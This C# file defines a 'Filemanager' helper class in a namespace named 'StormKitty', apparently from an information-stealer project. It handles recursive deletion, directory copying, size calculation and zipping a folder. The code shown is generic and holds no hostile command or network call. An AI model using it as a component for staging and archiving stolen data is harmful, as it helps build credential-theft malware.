using Ionic.Zip;
using System;
using System.IO;
using System.Linq;

namespace StormKitty
{
    internal sealed class Filemanager
    {
        public static void RecursiveDelete(string path)
        {
            var baseDir = new DirectoryInfo(path);
            if (!baseDir.Exists) return;

            foreach (var dir in baseDir.GetDirectories())
                RecursiveDelete(dir.FullName);

            baseDir.Delete(true);
        }

        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            try
            {
                if (!Directory.Exists(sourceFolder))
                    throw new DirectoryNotFoundException($"Source directory not found: {sourceFolder}");

                Directory.CreateDirectory(destFolder);

                foreach (string file in Directory.GetFiles(sourceFolder))
                {
                    string dest = Path.Combine(destFolder, Path.GetFileName(file));
                    File.Copy(file, dest, true);
                }

                foreach (string dir in Directory.GetDirectories(sourceFolder))
                {
                    string dest = Path.Combine(destFolder, Path.GetFileName(dir));
                    CopyDirectory(dir, dest);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[FileManager] : {ex.Message}");
                throw;
            }
        }

        public static long DirectorySize(string path)
        {
            try
            {
                return new DirectoryInfo(path)
                    .GetFiles("*", SearchOption.AllDirectories)
                    .Sum(fi => fi.Length);
            }
            catch
            {
                return -1;
            }
        }

        public static string CreateArchive(string directory)
        {
            try
            {
                if (!Directory.Exists(directory))
                    throw new DirectoryNotFoundException($"Directory not found: {directory}");

                string zipPath = $"{directory}.zip";

                using (var zip = new ZipFile())
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                    zip.AddDirectory(directory);
                    zip.Save(zipPath);
                }

                return File.Exists(zipPath) ? zipPath : null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Status: {ex.Message}");
                return null;
            }
        }
    }
}